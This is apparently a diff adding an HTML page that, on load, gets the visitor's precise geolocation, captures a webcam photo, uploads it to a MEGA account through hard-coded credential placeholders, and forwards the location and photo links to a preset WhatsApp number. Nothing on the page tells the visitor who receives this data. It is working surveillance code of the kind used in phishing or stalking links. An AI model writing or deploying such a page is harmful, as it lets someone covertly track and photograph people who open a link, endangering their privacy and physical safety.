@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Location & Auto Photo to WhatsApp</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mega/1.0.3/mega.min.js"></script>
+</head>
+<body>
+    <h1>Sending Live Location & Photo to WhatsApp...</h1>
+    <p id="status">Initializing...</p>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const MEGA_EMAIL = "your-email@gmail.com";  // Replace with your MEGA email
+        const MEGA_PASSWORD = "your-password";  // Replace with your MEGA password
+        const WHATSAPP_NUMBER = "94712345678";  // Replace with recipient's WhatsApp number
+
+        let locationLink = "";  // Store location link
+        let locationFilename = "";  // Store location as filename
+
+        // 📌 Function to send message to WhatsApp
+        function sendToWhatsApp(photoLink) {
+            const message = `📍 Location: ${locationLink}\n📷 Photo: ${photoLink}`;
+            const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
+            window.location.href = whatsappUrl; 
+        }
+
+        // 📌 Function to get live location
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        locationFilename = `photo_${lat}_${lng}.png`; // Use location as filename
+                        document.getElementById("status").innerText = "Location found! Taking photo...";
+                        capturePhoto();
+                    },
+                    (error) => {
+                        document.getElementById("status").innerText = "Error getting location: " + error.message;
+                    },
+                    { enableHighAccuracy: true, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        // 📌 Function to capture photo
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById("canvas");
+                    const ctx = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    stream.getTracks().forEach(track => track.stop());
+                    canvas.toBlob(uploadToMega, "image/png");
+                };
+            } catch (error) {
+                console.error("Camera access error:", error);
+            }
+        }
+
+        // 📌 Function to upload photo to MEGA
+        function uploadToMega(blob) {
+            const storage = new mega.Storage({
+                email: MEGA_EMAIL,
+                password: MEGA_PASSWORD,
+                autologin: true,
+                ready: function () {
+                    console.log("Logged into MEGA!");
+
+                    const file = storage.upload({
+                        name: locationFilename,  // 📌 Use location as filename
+                        data: blob,
+                        target: "root"
+                    });
+
+                    file.on("complete", function (fileData) {
+                        fileData.link((err, url) => {
+                            if (err) {
+                                console.error("MEGA link error:", err);
+                            } else {
+                                sendToWhatsApp(url);
+                            }
+                        });
+                    });
+
+                    file.on("error", function (err) {
+                        console.error("Upload failed:", err);
+                    });
+                }
+            });
+        }
+
+        // 📌 Start tracking location
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
